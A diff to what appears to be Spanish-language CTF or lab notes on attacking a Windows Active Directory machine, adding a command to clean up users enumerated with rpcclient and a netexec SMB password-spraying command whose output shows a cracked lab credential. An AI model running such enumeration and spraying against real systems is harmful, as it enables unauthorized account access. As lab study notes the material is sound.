@@ -448,6 +448,11 @@ rpcclient -U 'Administrator%P@$$W0rd'  10.201.3.6     >  userK.txt
 cat userK.txt | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' | sponge userK.txt 
 ```
 
+```bash
+cat userK.txt | grep -oP '(?<=\[).*?(?=\])' | grep -v "0x" > usuarios_limpios.txt
+```
+
+
 * Salida de los usuario
 ```bash
 Administrator
@@ -495,6 +500,13 @@ rpcclient $> querydispinfo
 
 ---
 
+## 🔎 Craquear Constreñas 
+
+```bash netexec smb 192.168.69.69 -u usuarios.txt -p ah.txt --continue-on-success | grep "+"
+
+
+SMB                      192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Whisky:MamasoyStream2er@ 
+```  
 
 
 ## 🔎 AS-REP Roasting
